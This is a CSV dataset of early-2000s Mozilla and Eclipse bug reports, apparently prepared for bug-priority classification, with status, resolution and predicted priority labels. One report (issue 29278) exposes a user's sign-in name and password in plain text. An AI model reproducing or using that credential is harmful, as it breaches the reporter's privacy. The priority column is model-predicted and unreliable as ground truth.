Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
22753,Plug-ins,PluginViewerImpl::StartLoad: content-type=audio/x-wav extremly slow,In 4.5 when I load this page on my site and click on one of the sounds; the plugin loads quickly and the sound plays properly. But using the 1999061808 build it loads very slowly; almost to the point of freezng the browser; then even after the sound is finished downloading the sound will not play properly. In the apprunner window PluginViewerImpl::StartLoad: content-type=audio/x-wav;  appears to be the command be used to inistailize the plug-in.,VERIFIED,WORKSFORME,[TITLE] Title: PluginViewerImpl::StartLoad: content-type=audio/x-wav extremly slow | [DESC] Description: In 4.5 when I load this page on my site and click on one of the sounds; the plugin loads quickly and the sound plays properly. But using the 1999061808 build it loads very slowly; almost to the point of freezng the browser; then even after the sound is finished downloading the sound will not play properly. In the apprunner window PluginViewerImpl::StartLoad: content-type=audio/x-wav;  appears to be the command be used to inistailize the plug-in. | [META] Component: Plug-ins | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
37245,Networking: Cache,disk cache not clearing from prefs,Overview Description:  Mac clear cache preference does not completely clean up ; directory.  Files left over.; ; Steps to Reproduce:; 1.)  with files in the cache select preferences - advanced - cache - clear disk ; cache.; 2.)  Open cache directory to look at contents; ; Actual Results:  there are still files left in cache; ; Expected Results:  these files should be deleted; ; Build Date & Platform Bug Found:; Mac 2000053008; ; Additional Builds and Platforms Tested On:; Seems to work on NT and Linux; ; Additional Information:; - after clear pressed the number of bytes in the cache is showing up smaller; - bug 39672 pertains to enabling the clear button from preferences,VERIFIED,INVALID,[TITLE] Title: disk cache not clearing from prefs | [DESC] Description: Overview Description:  Mac clear cache preference does not completely clean up ; directory.  Files left over.; ; Steps to Reproduce:; 1.)  with files in the cache select preferences - advanced - cache - clear disk ; cache.; 2.)  Open cache directory to look at contents; ; Actual Results:  there are still files left in cache; ; Expected Results:  these files should be deleted; ; Build Date & Platform Bug Found:; Mac 2000053008; ; Additional Builds and Platforms Tested On:; Seems to work on NT and Linux; ; Additional Information:; - after clear pressed the number of bytes in the cache is showing up smaller; - bug 39672 pertains to enabling the clear button from preferences | [META] Component: Networking: Cache | [META] Status: VERIFIED | [META] Resolution: INVALID,2
46581,CSS Parsing and Computation,CSSStyleRuleIMP::GetWeight/FindEndOfWeight called too much?,This bug was generated from Quantify analysis I did a while back.  Below is the ; posting I made to netscape.public.mozilla.performance on 2/22/2001.; ; At issue is the apparently inordinate number of calls to the functions ; CSSStyleRuleImpl::GetWeight and FindEndOfWeight (a static function in ; nsCSSStyleRuleImpl.cpp).  The latter is passed via a function pointer to ; nsSupportsArray::EnumerateForwards.  The static function simply converts the ; call to an invocation of the GetWeight method.; ; While the functions in question are small and efficient; in total 4+% of the ; time to open a new Navigator window is spent in these two functions (plus ; nsSupportsArray::EnumerateForwards; called the vast majority of time in order ; to call FindEndOfWeight).; ; I dont know exactly how these functions are being used but there might be an ; opportunity to optimize this by using a cache of some sort; or some other ; technique.; ; ----------------netscape.public.mozilla.performance post-------------------; I did Quantify runs to gather stats on window opening.  I measured opening a ; new Navigator window and also opening an empty XUL window (stripped out ; *everything*).; ; I sorted the two function lists by Function time to see how much of the former ; was basic overhead of opening a window (as measured by the latter).; ; The most interesting thing was in regard to the functions FindEndOfWeight; ; nsSupportsArray::EnumerateForwards; and CSSStyleRuleImpl::GetWeight.; ; In both cases; those 3 functions show up in the top 16 in total Function Time.  ; Heres the data:; ; function                 Nav                  Empty;                  rank Calls Ftime F%  rank Calls Ftime F%; -----------------------------------------------------------; FindEndOfWeight   6  409350 18.10 2.11  2  35244  1.56 7.22; EnumerateForwards 7    5101 11.94 1.39  7    579  1.02 4.75; GetWeight        16  412241  7.47 0.87  9  35789  0.65 3.01; ; I thought this seemed like a relatively large amount of time to be spent in ; these functions.  The biggest issue seems to be the number of calls to the ; FindEndOfWeight/GetWeight functions (the former is a static function passed by ; pointer to nsSupportsArray::EnumerateForwards; it calls GetWeight.; ; In the case of the empty window; we also see the static function ; InsertRuleByWeight (rank=~30;calls=555;Ftime=.05;F%=0.24%) but that doesnt ; show up at all near the top in the case of the Navigator window.; ; It appears (to my untrained eye) that there might be an opportunity to do some ; performance optimization in the style sheet rule setup/lookup code so that it ; doesnt have to call these functions so many times.; ; This is even more surprising in the case of the empty window; because in that ; case were only using the built-in style sheets (none of the XUL/chrome ones).; ; It seems odd that nsSupportsArray::EnumerateForwards shows up here because it ; is called only about 1/80th as often as those other two functions.  That ; function is pretty simple:;     PRInt32 aIndex = -1;;     PRBool running = PR_TRUE;;     while (running && (++aIndex < (PRInt32)mCount)) {;        running = (*aFunc)(mArray[aIndex]; aData);;     };     return running;; ; What is it about that code that puts this functions Ftime out of proportion to ; the number of times it is called?  Is mArray[aIndex] inlined?; ; Bill,RESOLVED,DUPLICATE,[TITLE] Title: CSSStyleRuleIMP::GetWeight/FindEndOfWeight called too much? | [DESC] Description: This bug was generated from Quantify analysis I did a while back.  Below is the ; posting I made to netscape.public.mozilla.performance on 2/22/2001.; ; At issue is the apparently inordinate number of calls to the functions ; CSSStyleRuleImpl::GetWeight and FindEndOfWeight (a static function in ; nsCSSStyleRuleImpl.cpp).  The latter is passed via a function pointer to ; nsSupportsArray::EnumerateForwards.  The static function simply converts the ; call to an invocation of the GetWeight method.; ; While the functions in question are small and efficient; in total 4+% of the ; time to open a new Navigator window is spent in these two functions (plus ; nsSupportsArray::EnumerateForwards; called the vast majority of time in order ; to call FindEndOfWeight).; ; I dont know exactly how these functions are being used but there might be an ; opportunity to optimize this by using a cache of some sort; or some other ; technique.; ; ----------------netscape.public.mozilla.performance post-------------------; I did Quantify runs to gather stats on window opening.  I measured opening a ; new Navigator window and also opening an empty XUL window (stripped out ; *everything*).; ; I sorted the two function lists by Function time to see how much of the former ; was basic overhead of opening a window (as measured by the latter).; ; The most interesting thing was in regard to the functions FindEndOfWeight; ; nsSupportsArray::EnumerateForwards; and CSSStyleRuleImpl::GetWeight.; ; In both cases; those 3 functions show up in the top 16 in total Function Time.  ; Heres the data:; ; function                 Nav                  Empty;                  rank Calls Ftime F%  rank Calls Ftime F%; -----------------------------------------------------------; FindEndOfWeight   6  409350 18.10 2.11  2  35244  1.56 7.22; EnumerateForwards 7    5101 11.94 1.39  7    579  1.02 4.75; GetWeight        16  412241  7.47 0.87  9  35789  0.65 3.01; ; I thought this seemed like a relatively large amount of time to be spent in ; these functions.  The biggest issue seems to be the number of calls to the ; FindEndOfWeight/GetWeight functions (the former is a static function passed by ; pointer to nsSupportsArray::EnumerateForwards; it calls GetWeight.; ; In the case of the empty window; we also see the static function ; InsertRuleByWeight (rank=~30;calls=555;Ftime=.05;F%=0.24%) but that doesnt ; show up at all near the top in the case of the Navigator window.; ; It appears (to my untrained eye) that there might be an opportunity to do some ; performance optimization in the style sheet rule setup/lookup code so that it ; doesnt have to call these functions so many times.; ; This is even more surprising in the case of the empty window; because in that ; case were only using the built-in style sheets (none of the XUL/chrome ones).; ; It seems odd that nsSupportsArray::EnumerateForwards shows up here because it ; is called only about 1/80th as often as those other two functions.  That ; function is pretty simple:;     PRInt32 aIndex = -1;;     PRBool running = PR_TRUE;;     while (running && (++aIndex < (PRInt32)mCount)) {;        running = (*aFunc)(mArray[aIndex]; aData);;     };     return running;; ; What is it about that code that puts this functions Ftime out of proportion to ; the number of times it is called?  Is mArray[aIndex] inlined?; ; Bill | [META] Component: CSS Parsing and Computation | [META] Status: RESOLVED | [META] Resolution: DUPLICATE,3
32452,Networking,File type of */* crashes Mozilla.,Using M14 load http://channel.web.aol.com/preview.cdf; This crashes the M14 release: winNT build 2000022820.; Loading in N4.61 gives a popup that says; You have started to download a file ; of type */* etc...; ; Expected result: no crash.; cbegle was kind enough to fetch my stack trace from my talkbalk report:; Sorry about the sucky formatting.  ; ; ;  Trigger Type:  Program Crash ;  Trigger Reason:  Stack overflow ;  Thread ID:   ; ;  Call Stack:    (Signature = Compare2To2 a3efe715)      ;    Compare2To2               ; [d:\builds\seamonkey\mozilla\xpcom\ds\bufferRoutines.h; line 508];    nsStr::Compare ;             [d:\builds\seamonkey\mozilla\xpcom\ds\nsStr.cpp; line 612]  ;    nsString::Equals ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsString2.cpp; line 1889];    nsString::operator==      ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsString2.cpp; line 1833];    nsStringKey::Equals  ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 278];    _hashKeyCompare           ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 38];    PL_HashTableRawLookup ;      [plhash.c; line 190]     ;    PL_HashTableLookup ;                               [plhash.c; line 345];    nsHashtable::Get          ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 170];    nsStr::Append ;              [d:\builds\seamonkey\mozilla\xpcom\ds\nsStr.cpp; line 173];    _pl_SetupNativeNotifier,VERIFIED,FIXED,[TITLE] Title: File type of */* crashes Mozilla. | [DESC] Description: Using M14 load http://channel.web.aol.com/preview.cdf; This crashes the M14 release: winNT build 2000022820.; Loading in N4.61 gives a popup that says; You have started to download a file ; of type */* etc...; ; Expected result: no crash.; cbegle was kind enough to fetch my stack trace from my talkbalk report:; Sorry about the sucky formatting.  ; ; ;  Trigger Type:  Program Crash ;  Trigger Reason:  Stack overflow ;  Thread ID:   ; ;  Call Stack:    (Signature = Compare2To2 a3efe715)      ;    Compare2To2               ; [d:\builds\seamonkey\mozilla\xpcom\ds\bufferRoutines.h; line 508];    nsStr::Compare ;             [d:\builds\seamonkey\mozilla\xpcom\ds\nsStr.cpp; line 612]  ;    nsString::Equals ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsString2.cpp; line 1889];    nsString::operator==      ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsString2.cpp; line 1833];    nsStringKey::Equals  ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 278];    _hashKeyCompare           ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 38];    PL_HashTableRawLookup ;      [plhash.c; line 190]     ;    PL_HashTableLookup ;                               [plhash.c; line 345];    nsHashtable::Get          ; [d:\builds\seamonkey\mozilla\xpcom\ds\nsHashtable.cpp; line 170];    nsStr::Append ;              [d:\builds\seamonkey\mozilla\xpcom\ds\nsStr.cpp; line 173];    _pl_SetupNativeNotifier | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: FIXED,0
39104,Layout,<TEXTAREA> Back/Forward Arrow keys jump 2 chars instead of 1,Windows 98 Build 2000071112; ; For some strange reason; the keyboard forward/back arrow buttons jump 2 ; characters forward/back instead of just 1.  I first noticed this bug in a ; <TEXTAREA> at bugzilla.  Regular text fields do not experience this bug.,VERIFIED,FIXED,[TITLE] Title: <TEXTAREA> Back/Forward Arrow keys jump 2 chars instead of 1 | [DESC] Description: Windows 98 Build 2000071112; ; For some strange reason; the keyboard forward/back arrow buttons jump 2 ; characters forward/back instead of just 1.  I first noticed this bug in a ; <TEXTAREA> at bugzilla.  Regular text fields do not experience this bug. | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: FIXED,2
19428,Resources,DCR - Callbacks to notice file changes,Open a *.java file.; 	Open it with notepad.; 	Change it in the notepad and save.; 	Go back to the eclipse workbench.; 		1st problem:; 			If the editor was activated when notepad was opened ; 			you do not get the File was changed in the file system.....  message until you deactivate and; 			re-activate the editor.; 	Activate the editor; 	- The message dialog will open asking if you want to load the changes made in the file system.; 	Say no.; 		; 	2nd problem:; 		The text should be marked as dirty since it is not the same as the one save in the file system.	; ; NOTES:,RESOLVED,FIXED,[TITLE] Title: DCR - Callbacks to notice file changes | [DESC] Description: Open a *.java file.; 	Open it with notepad.; 	Change it in the notepad and save.; 	Go back to the eclipse workbench.; 		1st problem:; 			If the editor was activated when notepad was opened ; 			you do not get the File was changed in the file system.....  message until you deactivate and; 			re-activate the editor.; 	Activate the editor; 	- The message dialog will open asking if you want to load the changes made in the file system.; 	Say no.; 		; 	2nd problem:; 		The text should be marked as dirty since it is not the same as the one save in the file system.	; ; NOTES: | [META] Component: Resources | [META] Status: RESOLVED | [META] Resolution: FIXED,3
25412,Profile: BackEnd,[DOGFOOD]Wrong bookmarks if profile migrated by start button,Chofmanns machine had a bunch of 5.0 profiles on it and hes never run the; -installer flag.  When we went into profile manager; the old profile showed up; with the migrate flag on it.  When we picked that profile and hit the start; button; we got all the correct prefs but we go some other profiles bookmarks.; ; Somehow; in this one case; the bookmarks module got the wrong profile directory.,VERIFIED,FIXED,[TITLE] Title: [DOGFOOD]Wrong bookmarks if profile migrated by start button | [DESC] Description: Chofmanns machine had a bunch of 5.0 profiles on it and hes never run the; -installer flag.  When we went into profile manager; the old profile showed up; with the migrate flag on it.  When we picked that profile and hit the start; button; we got all the correct prefs but we go some other profiles bookmarks.; ; Somehow; in this one case; the bookmarks module got the wrong profile directory. | [META] Component: Profile: BackEnd | [META] Status: VERIFIED | [META] Resolution: FIXED,2
42283,Networking,Crash involving JavaScript alert in one thread and incoming page in another,Build id:  2000090811; Reproducible:  Havent tried.  Suspect its sensitive to timing.; ; I was testing the following JavaScript code:; ; function goto_page (url) {;    location.replace(url);;    setTimeout(retry_goto_page( + url + ); server_response_timeout);; }; ; function retry_goto_page (url) {;    if (confirm (Sorry for the delay.  Our server is probably either very busy ; or is down.  Try again?));      { goto_page(url) }; }; ; I caused the alert to come up by deliberately delaying my servers response.  ; Then I allowed the server to respond; and the page started loading ; asynchronously behind the dialog.  I clicked on the OK button (I think); causing ; it to location.replace with the same URL that was in the middle of loading.  ; Ill attach a MacsBug StdLog.  Mozilla was the selected application and shows up ; in the stack trace; but note that the log shows Macintosh Common Lisp as the ; currently running process.,VERIFIED,WORKSFORME,[TITLE] Title: Crash involving JavaScript alert in one thread and incoming page in another | [DESC] Description: Build id:  2000090811; Reproducible:  Havent tried.  Suspect its sensitive to timing.; ; I was testing the following JavaScript code:; ; function goto_page (url) {;    location.replace(url);;    setTimeout(retry_goto_page( + url + ); server_response_timeout);; }; ; function retry_goto_page (url) {;    if (confirm (Sorry for the delay.  Our server is probably either very busy ; or is down.  Try again?));      { goto_page(url) }; }; ; I caused the alert to come up by deliberately delaying my servers response.  ; Then I allowed the server to respond; and the page started loading ; asynchronously behind the dialog.  I clicked on the OK button (I think); causing ; it to location.replace with the same URL that was in the middle of loading.  ; Ill attach a MacsBug StdLog.  Mozilla was the selected application and shows up ; in the stack trace; but note that the log shows Macintosh Common Lisp as the ; currently running process. | [META] Component: Networking | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
25795,Editor,Find backwards not working,using 9/23 build of apprunner; ; 1) launch apprunner and editor; 2) Edit | Find; 3) enter soem text to find(e.g. list); 4) Find all the way to the bottom of doc; 5) click on backwards checkbox; 6) click Find; ; it doesnt go backwards.; ; all platforms.,VERIFIED,WORKSFORME,[TITLE] Title: Find backwards not working | [DESC] Description: using 9/23 build of apprunner; ; 1) launch apprunner and editor; 2) Edit | Find; 3) enter soem text to find(e.g. list); 4) Find all the way to the bottom of doc; 5) click on backwards checkbox; 6) click Find; ; it doesnt go backwards.; ; all platforms. | [META] Component: Editor | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
45276,Layout: Tables,Table renders incorrectly with margins=0 on body tag,Table attached renders incorrectly because second row are not showed. IE 4&5; shows OK and NS4 shows incorrectly but better than mozilla.; ; Try this code on IE and you will see how it must to be rendered. getting rid of; LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0; tags then mozilla renders OK; ; <HTML>; <BODY LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0>; <TABLE BORDER=1 CELLSPACING=0 CELLPADDING=0 HEIGHT=100% WIDTH=100%>; <TR HEIGHT=100%>;   <!-- The height on the td tag is necessary for NS4 compatibility -->;   TD HEIGHT=100%>TOP ROW</TD>; </TR>; <TR HEIGHT=20>;   <TD HEIGHT=20>BOTTOM ROW</TD>; </TR>; </TABLE>; </BODY>; </HTML>,VERIFIED,WONTFIX,[TITLE] Title: Table renders incorrectly with margins=0 on body tag | [DESC] Description: Table attached renders incorrectly because second row are not showed. IE 4&5; shows OK and NS4 shows incorrectly but better than mozilla.; ; Try this code on IE and you will see how it must to be rendered. getting rid of; LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0; tags then mozilla renders OK; ; <HTML>; <BODY LEFTMARGIN=0 TOPMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0>; <TABLE BORDER=1 CELLSPACING=0 CELLPADDING=0 HEIGHT=100% WIDTH=100%>; <TR HEIGHT=100%>;   <!-- The height on the td tag is necessary for NS4 compatibility -->;   TD HEIGHT=100%>TOP ROW</TD>; </TR>; <TR HEIGHT=20>;   <TD HEIGHT=20>BOTTOM ROW</TD>; </TR>; </TABLE>; </BODY>; </HTML> | [META] Component: Layout: Tables | [META] Status: VERIFIED | [META] Resolution: WONTFIX,2
21916,Networking: Cookies,Yahoo/AOL mail never logs in,Every time I try to go to Yahoo mail; I get a page from Yahoo mail saying my; login session has expired.  I click on the link to log back in and it still; says my login session has expired.  I cant get into Yahoo mail at all!,VERIFIED,DUPLICATE,[TITLE] Title: Yahoo/AOL mail never logs in | [DESC] Description: Every time I try to go to Yahoo mail; I get a page from Yahoo mail saying my; login session has expired.  I click on the link to log back in and it still; says my login session has expired.  I cant get into Yahoo mail at all! | [META] Component: Networking: Cookies | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
35311,Event Handling,Right clicking and holding down right button doesnt select items,From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; U; Linux 2.2.14 i686; en-US; m15); BuildID:; ; Using a right mouse button to bring up a property menu and holding it down; doesnt select the items on the menu. You have to release the mouse button. This; is inconsistent with the normal menus.; ; ; ; Reproducible: Always; Steps to Reproduce:; 1.Right click on page (keep mouse held down); 2.Move mouse down,VERIFIED,DUPLICATE,[TITLE] Title: Right clicking and holding down right button doesnt select items | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/5.0 (X11; U; Linux 2.2.14 i686; en-US; m15); BuildID:; ; Using a right mouse button to bring up a property menu and holding it down; doesnt select the items on the menu. You have to release the mouse button. This; is inconsistent with the normal menus.; ; ; ; Reproducible: Always; Steps to Reproduce:; 1.Right click on page (keep mouse held down); 2.Move mouse down | [META] Component: Event Handling | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
29278,HTML: Form Submission,cant sign in to netcenter from m12,i have calendar as one item in my panels.  when i click on a date i get a; netcenter sign in page.  when i enter my username billtopp and my password; alicia it wont accept them.; ; i have logged in and out of netcenter about ten times today using 4.7.  once in; a while it will reject the password but when i re-enter it it accepts.; ; i cant get the same process to work with m12.  it may be that m12 has cached; the wrong password and entering the correct one doesnt override the cache.; whatever; i cant get into netcenter from m12 using a username and password that; work perfectly in 4.7,VERIFIED,WORKSFORME,[TITLE] Title: cant sign in to netcenter from m12 | [DESC] Description: i have calendar as one item in my panels.  when i click on a date i get a; netcenter sign in page.  when i enter my username billtopp and my password; alicia it wont accept them.; ; i have logged in and out of netcenter about ten times today using 4.7.  once in; a while it will reject the password but when i re-enter it it accepts.; ; i cant get the same process to work with m12.  it may be that m12 has cached; the wrong password and entering the correct one doesnt override the cache.; whatever; i cant get into netcenter from m12 using a username and password that; work perfectly in 4.7 | [META] Component: HTML: Form Submission | [META] Status: VERIFIED | [META] Resolution: WORKSFORME,2
21189,ImageLib,Wont display the PNG!,I want to page so see the PNG support and PNGs wont display at all!,VERIFIED,DUPLICATE,[TITLE] Title: Wont display the PNG! | [DESC] Description: I want to page so see the PNG support and PNGs wont display at all! | [META] Component: ImageLib | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
39678,Editor,Each word jumps to next line while typing,7/27 linux build:; ; In the html mail compose window; but not in the html editor window; for each; word you type; as soon as you start typing the word; the caret jumps to the next; line.  When you type a space to end the word; the word jumps back to the; previous line where it belongs; but as soon as you type a non-space character;; the next word jumps back down to the next line.; ; Its very difficult to type this way.; ; Ccing everybody who checked into editor or layout yesterday.,VERIFIED,FIXED,[TITLE] Title: Each word jumps to next line while typing | [DESC] Description: 7/27 linux build:; ; In the html mail compose window; but not in the html editor window; for each; word you type; as soon as you start typing the word; the caret jumps to the next; line.  When you type a space to end the word; the word jumps back to the; previous line where it belongs; but as soon as you type a non-space character;; the next word jumps back down to the next line.; ; Its very difficult to type this way.; ; Ccing everybody who checked into editor or layout yesterday. | [META] Component: Editor | [META] Status: VERIFIED | [META] Resolution: FIXED,2
25592,Profile: BackEnd,Last of 4.x profiles migrates automatically,Steps to reproduce:; 1. create 3 4.x profiles; 2. run apprunner -installer; migrate profile1; 3. run apprunner -installer again (or apprunner -ProfileManager or apprunner; -mail) and migrate profile2; 4. Run apprunner a third time; ; Actual Result: remaining profile; profile3; will show as migrated.; ; Expected results: 3rd profile would display with migrate tag to show it needed; migration; ; On Win32 machines; checking Linux; n/a on Mac yet,VERIFIED,FIXED,[TITLE] Title: Last of 4.x profiles migrates automatically | [DESC] Description: Steps to reproduce:; 1. create 3 4.x profiles; 2. run apprunner -installer; migrate profile1; 3. run apprunner -installer again (or apprunner -ProfileManager or apprunner; -mail) and migrate profile2; 4. Run apprunner a third time; ; Actual Result: remaining profile; profile3; will show as migrated.; ; Expected results: 3rd profile would display with migrate tag to show it needed; migration; ; On Win32 machines; checking Linux; n/a on Mac yet | [META] Component: Profile: BackEnd | [META] Status: VERIFIED | [META] Resolution: FIXED,2
28626,Layout,bad HTML fools Gecko,A ran into a bit of HTML that confuses Gecko; in an article on abcnews.com. Load; this page:; ; <html>; from abcnews.com; <font face=arial size=4 color=#3366cc><b>Assistance; Makes; the Difference</font></b>; Cuomo described the study; <html>; ; Note how <font> and <b> are improperly nested. Still;; Navigator (for instance); does what the authors no doubt; intended; while mozilla continues to use the font for; the rest of the article.,VERIFIED,DUPLICATE,[TITLE] Title: bad HTML fools Gecko | [DESC] Description: A ran into a bit of HTML that confuses Gecko; in an article on abcnews.com. Load; this page:; ; <html>; from abcnews.com; <font face=arial size=4 color=#3366cc><b>Assistance; Makes; the Difference</font></b>; Cuomo described the study; <html>; ; Note how <font> and <b> are improperly nested. Still;; Navigator (for instance); does what the authors no doubt; intended; while mozilla continues to use the font for; the rest of the article. | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
29033,Layout,Incomplete rendering,The rendering on this page is incomplete. If you go to this page; you sill see; what I mean. Parts of the page are rendered. But the rest of the page is a grey; background.,VERIFIED,DUPLICATE,[TITLE] Title: Incomplete rendering | [DESC] Description: The rendering on this page is incomplete. If you go to this page; you sill see; what I mean. Parts of the page are rendered. But the rest of the page is a grey; background. | [META] Component: Layout | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
48417,Security: UI,security state not reset after loading about:blank pages,currently using mozilla build 2002042906 on winNT4; but I have seen this on more; recent build also.; ; step to reproduce:; 1.load https://digitalid.verisign.com; 2.type about:blank/about:cache or about:plugins in the url bar and hit enter; ; Current result:; Security state is still set to the prior visited webpage/site. The page info is; also wrong; after you click on the lock icon.; ; Expected result:; Security state for should be reset for the about: protocol ; ; Note: I did a search for security and lock icon but I was couldnt find a; dup. This issue might be already covered by a private/protected security bug; filed by someone else; but I dont have access to this kind of information.,VERIFIED,FIXED,[TITLE] Title: security state not reset after loading about:blank pages | [DESC] Description: currently using mozilla build 2002042906 on winNT4; but I have seen this on more; recent build also.; ; step to reproduce:; 1.load https://digitalid.verisign.com; 2.type about:blank/about:cache or about:plugins in the url bar and hit enter; ; Current result:; Security state is still set to the prior visited webpage/site. The page info is; also wrong; after you click on the lock icon.; ; Expected result:; Security state for should be reset for the about: protocol ; ; Note: I did a search for security and lock icon but I was couldnt find a; dup. This issue might be already covered by a private/protected security bug; filed by someone else; but I dont have access to this kind of information. | [META] Component: Security: UI | [META] Status: VERIFIED | [META] Resolution: FIXED,1
48275,Layout,word wrap image align right nested lists broken,From Bugzilla Helper:; User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.9+) Gecko/20020404; BuildID:    2002040403; ; test case is the best way to see this bug; the top example the list is nested;; and the wordwrap doesnt restore to normal when the end of the image is reached;; ; however; if the lists arent nested; like below; the wordwrap works fine.; ; Reproducible: Always; Steps to Reproduce:; 1. Insert an image on a page that is align=right; 2. Make a list nested =(>)2 levels.; 3. Type enough crud to reach beyond the end of the image.; 4. Notice that the text isnt wrapping correctly.; ; Expected Results:  The browser should wrap to the end of the window after it; gets beyond the image.,RESOLVED,DUPLICATE,[TITLE] Title: word wrap image align right nested lists broken | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.9+) Gecko/20020404; BuildID:    2002040403; ; test case is the best way to see this bug; the top example the list is nested;; and the wordwrap doesnt restore to normal when the end of the image is reached;; ; however; if the lists arent nested; like below; the wordwrap works fine.; ; Reproducible: Always; Steps to Reproduce:; 1. Insert an image on a page that is align=right; 2. Make a list nested =(>)2 levels.; 3. Type enough crud to reach beyond the end of the image.; 4. Notice that the text isnt wrapping correctly.; ; Expected Results:  The browser should wrap to the end of the window after it; gets beyond the image. | [META] Component: Layout | [META] Status: RESOLVED | [META] Resolution: DUPLICATE,3
38599,Layout: Form Controls,<input type=text> doesnt fire onchange event,From Bugzilla Helper:; User-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.2.14-12 i686; Nav); BuildID:    2000062709; ; [Pls. note: Im submitting this via NS 4.73 as Mozilla crashed on me during the; first time entering the bug report :]; ; <INPUT TYPE=text onchange=alert(onchange)> does not work. The event does; not get fired.; ; Reproducible: Always; Steps to Reproduce:; 1. open attached test case; 2. change contents in text field; 3. nothing happens when focus on text field is lost; ; Actual Results:  nothing happens; ; Expected Results:  alert box should pop up as defined in onchange= handler,VERIFIED,DUPLICATE,[TITLE] Title: <input type=text> doesnt fire onchange event | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/4.73 [en] (X11; U; Linux 2.2.14-12 i686; Nav); BuildID:    2000062709; ; [Pls. note: Im submitting this via NS 4.73 as Mozilla crashed on me during the; first time entering the bug report :]; ; <INPUT TYPE=text onchange=alert(onchange)> does not work. The event does; not get fired.; ; Reproducible: Always; Steps to Reproduce:; 1. open attached test case; 2. change contents in text field; 3. nothing happens when focus on text field is lost; ; Actual Results:  nothing happens; ; Expected Results:  alert box should pop up as defined in onchange= handler | [META] Component: Layout: Form Controls | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
